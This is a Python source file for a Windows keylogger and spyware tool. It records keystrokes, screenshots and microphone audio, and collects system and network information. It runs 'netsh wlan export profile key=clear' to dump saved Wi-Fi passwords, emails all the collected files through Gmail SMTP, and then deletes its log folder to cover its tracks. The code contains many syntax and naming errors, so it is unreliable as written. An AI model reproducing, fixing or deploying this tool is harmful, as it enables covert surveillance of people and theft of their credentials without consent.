import logging
from pynput.keyboard import Key,Listener
from pathlib import Path
import PIL
import time
import sounddevive
from scipy.io.wavfile import write
import subprocess
import socket
import requests
import shutil
from multiprocessing import Process  
import os
import re  
from email.mime.multipart import MIMEMultipart      
from email.mime.text import MIMEText                
from email.mime.base import MIMEBase                
from email import encoders
import smtplib
from cryptography.fernet import Fernet



#Function for Gathering Keyboard_Inputs
def keylogs_inputs(path):
    #Logging is a means of tracking events that happen when some software runs.
    #logging.DEBUG -> Detailed information , logging.INFO -> Confirmation that things are working as expected.
    #configuring the logging events path,format and level of tracking logs.
    logging.basicConfig(filename=(path+'keylogs.txt'),level=logging.DEBUG,format='%(asctime)s: %(message)s')
   
    #To Monitor the keyboard we use Key and Listener
    on_typed=lambda Key : logging.info(str(Key))
   
    #Collect events until released
    with keyboard.Listener(on_press=on_typed) as listener:
        listener.join()
       
#Function for Gathering Screenshots_inputs
def screenshot_inputs(path):
    #pathlib provides classes that represent file system paths with semantics suitable for different operating systems.
    Path('C:/Users/Public/Logs/Screenshots').mkdir(parents=True, exist_ok=True)
    Screenshots_path=path+'Screenshots\\'
   
    #Collecting Screenshots from screen using ImageGrab module
    #ImageGrab module can be used to copy the contents of the screen or the clipboard to a PIL image memory.
    for i in range(10):
        screenshots=PIL.ImageGrab.grab()
        screenshot.save(Screenshots_path +'screenshot{}.png'.format(i))
        #For every 5 secs it take screenshot and save in the path.
        time.sleep(5)

#Function for Gathering Microphone_inputs
def microphone_inputs(path):
    for i in range(0,5):
        #In the most cases we will be 44100 or 48000 frames per second
        #sounddevice holding audio data with a sampling frequency by using numpyarray
        sampling_frequency=44100
        duration=10  # seconds
   
        #Record audio data as in the format of NumPy array
        recording=sounddevice.rec(frames=int(duration*sampling_frequency),samplerate=sampling_frequency,channels=2)
   
        #Wait for play()/rec()/playrec() to be finished.
        sounddevice.wait()
   
        #Write a NumPy array as a WAV file.
        write(path+'{}mic_recording.wav'.format(i),sampling_frequency,recording)
'''
as.string()  
 |
 +------------MIMEMultipart  
              |                                                |---content-type  
              |                                   +---header---+---content disposition  
              +----.attach()-----+----MIMEBase----|  
                                 |                +---payload (to be encoded in Base64)
                                 +----MIMEText
'''

#MIME is Multipurpose Internet Mail Extension is an email application program that extends the email messages format to handle the jobs.
#Using MIME we can send multiple attachments within a single email message,including binary files,audio,video,..

#SMTP is Simple Mail Transfer protocol
#Using SMTP we can send formatted text in an email message not all audio,video,(only support a single body of ASCII text)

'''email.MIME,this module is part of the legacy (Compat32) email API.you get a message object structure by passing a file or some text to a parser,
it parses the text and returns the root message object
In this the messages are converted to objects after performing the operations on objects converted to normal message.

It consists of classes like,
email.mime.base.MIMEBase as this is the base class for all the MIME-specific subclasses of Message.
email.mime.multipart.MIMEMultipart for A subclass of MIMEBase,this is an intermediate base class for MIME messages that are multipart. The optional _subtype is mixed by default, but can be used to specify a message subtype.
 A ContentType header for multipart / _subtype is added to the message object.
 A MIMEVersion header is also  added.
 email.mime.text.MIMEText A subclass of MIMENonMultipart, the class MIMEText  is used to create a MIME object for the main type of Text.
'''

def email_MIME_base(msg,email):
    msg['From']=email
    msg['To']=email
    msg['Subject']="Activity Monitoring Using keylogger Success"
    body="Activity Monitoring Using keylogger Completed Successfully"
    msg.attach(MIMEText(body,'plain'))#creating objects of type text and attaching it to msg.
    return msg
   
    #The smtplib module defines an SMTP client session object that can be used to send email to any internet machine using the SMTP listener.
   
def smtplib(email,password,msg):
    #smtplib.SMTP('localhost', port)
    #smtp.gmail.com -> Gmail SMTP server lets you send emails using your Gmail account and Google's servers
    server=smtplib.SMTP('smtp.gmail.com',587)
    #We are using the tls communication in secured way.
    #port->587 for tls and port->465 for ssl
    server.starttls()    
    server.login(email,password)
    text=msg.as_string() #changing objects as string
    server.sendmail(email,email,text)#sending the content to the provided mail
    server.quit()
   
    #Now We separate the files of different format using regular Expressions for sending the email in structured format.
    #Because we have formats of .txt,.wav,.png,.xml.
   
def send_mail(path):
    txt=re.compile(r'.+\.txt$')
    png=re.compile(r'.+\.png$')
    jpg=re.compile(r'.+\.jpg$')
    wav=re.compile(r'.+\.wav$')
    xml=re.compile(r'.+\.xml$')  
   
    #Enter the Admin Email and Password
    email=''
    password=''
   
    msg=MIMEMultipart()
    email_MIME_base(msg,email)
   
    #This is mainly for as screenshot is the folder others are directly files
    omit=Set(['Screenshots'])
    for dirpath, dirnames, filenames in os.walk(path,topdown=True):
        dirnames[:] = [d for d in dirnames if d not in omit]
       
        #Here the based on the match of the file reading of the file and making objects and sending objects after encoding them to content by payload and header
        for file in filenames:
            if(txt.match(file) or png.match(file) or jpg.match(file) or xml.match(file)):
                part=MIMEBase('application', "octet-stream")
                with open(path+'\\'+file, 'rb') as attachment:
                    part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition','attachment;''filename = {}'.format(file))
                msg.attach(part)

            # If a Regex5 (WAV) variable matches,  that single match will be sent attached to its own individual email.
            elif wav.match(file):
                wav_msg= MIMEMultipart()
                email_MIME_base(wav_msg,email)
                part=MIMEBase('application', "octet-stream")
                with open(path +'\\'+file,'rb') as attachment:
                    part.set_payload(attachment.read())
                encoders.encode_base64(p)
                part.add_header('Content-Disposition', 'attachment;' 'filename = {}'.format(file))
                wav_msg.attach(part)

                smtptlib(email, password,wav_msg)

            else:
                pass

    # To send any other files like non wav files
    smtptlib(email, password, msg)
def main():
    #we directly gathering the Network-info and System-info using subprocess and socket modules
    Path('C:/Users/Public/Logs').mkdir(parents=True,exist_ok=True)
    path='C:\\Users\\Public\\Logs\\'
   
   
    #Gathering the System-info
   
    #socket provides access to the BSD socket interface and socket() function returns a socket object whose methods implement the various socket system calls
    #BSD API is a set of standard function calls that can be used in an application.
    #They allow programmers to add Internet communication to their products.
   
    HostName=socket.gethostname()
    private_IP=socket.gethostbyname(hostname)
   
    with open(path+'system-info.txt','a') as system-info:
        try:
            public_IP = requests.get('https://api.ipify.org').text
           
        except requests.ConnectionError:
            public_ip = 'Ipify connection failed'
            pass

        system-info.write('Public IP Address:' +public_IP +'\n'+'Private IP Address:'+private_IP+'\n')
        try:
           
            #The subprocess module allows you to spawn new processes,
            #connect to their input/output/error pipes, and obtain their return codes
            #stdout -> Captured stdout from the child process and stderr -> Captured stderr from the child process.
            #The underlying process creation and management in this module is handled by the Popen class.
           
            system_info=subprocess.Popen(['systeminfo','&','tasklist','&','sc','query'],
                            stdout=system-info,stderr=system-info,shell=True)
                                       
            #Popen.communicate -> Interact with process: Send data to stdin. Read data from stdout and stderr, until end-of-file is reached
            #The timeout argument is passed to Popen.communicate(). If the timeout expires,the child process will be killed and waited for.
            #The TimeoutExpired exception will be re-raised after the child process has terminated                          
            # The communicate funtion is used to initiate a 60 second timeout for the shell.
            outputs,errors=system_info.communicate(timeout=15_
           
        except subprocess.TimeoutExpired:
            system_info.kill()
            outputs,errors=system_info.communicate()

   
    #Gathering the Network-info
    #open() -> opens a file,and returns it as a file object
    #'a' mode is used to Opens a file for appending, creates the file if it does not exist
    with open(path+'network-info.txt','a') as network-info:
        try:
            #The subprocess module allows you to spawn new processes,
            #connect to their input/output/error pipes, and obtain their return codes
            #stdout -> Captured stdout from the child process and stderr -> Captured stderr from the child process.
            #The underlying process creation and management in this module is handled by the Popen class.
           
            network_info=subprocess.Popen([ 'Netsh','WLAN','export','profile','folder=C:\\Users\\Public\\Logs\\','key=clear',
                                        '&','ipconfig','/all','&','arp','-a','&','getmac','-V','&','route','print','&',
                                        'netstat', '-a'],stdout=network-info,stderr=network-info, shell=True)
                                       
            #Popen.communicate -> Interact with process: Send data to stdin. Read data from stdout and stderr, until end-of-file is reached
            #The timeout argument is passed to Popen.communicate(). If the timeout expires,the child process will be killed and waited for.
            #The TimeoutExpired exception will be re-raised after the child process has terminated                          
            # The communicate funtion is used to initiate a 60 second timeout for the shell.
            outputs,errors=network.communicate(timeout=60)
           
        except subprocess.TimeoutExpired:
            network_info.kill()
            outputs,errors=network_info.communicate()
           
    #To concurrently run the processes of key_logs,screenshots,microphones
    #multiprocessing is a package that supports spawning processes using an API similar to the threading module.
    #The multiprocessing package offers both local and remote concurrency, effectively side-stepping the Global Interpreter Lock by using subprocesses instead of threads
    #In Multiprocessing,processes are spawned by creating a Process object and then calling its start().
    p1=Process(target=keylogs_inputs,args=(path,)
    p1.start()
    p2=Process(target=screenshot_inputs,args=(path,)
    p2.start()
    p3=Process(target=microphone_inputs,args=(path,)
    p3.start()
   
    #To stop and terminate the process based on the specified timeout
   
    p1.join(timeout=300)
    p2.join(timeout=300)
    p3.join(timeout=300)
    p1.terminate()
    p2.terminate()
    p3.terminate()
   
   

   
    #send files to the Email
   
    send_mail('C:\\Users\\Public\\Logs') # send all files to specified email in logs folder
    send_mail('C:\\Users\\Public\\Logs\\Screenshots')#send files in screenshot folder to specified folder
   
   
    #shutil is used for supporting file copying and removal.
    #shutil.rmtree -> Delete an entire directory tree
    shutil.rmtree('C:\\Users\\Public\\Logs')
   
    #running main() loop
   
    main()
   
       
   

#When an error the trace can be logged to a file for admin.
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('Control-C entered,Program Exiting out')
    except Exception as e:
        logging.basicConfig(filename='C:/Users/Public/Logs/error_log.txt',level=logging.DEBUG)
        logging.exception('Error Ocurred: {}'.format(e))
        pass
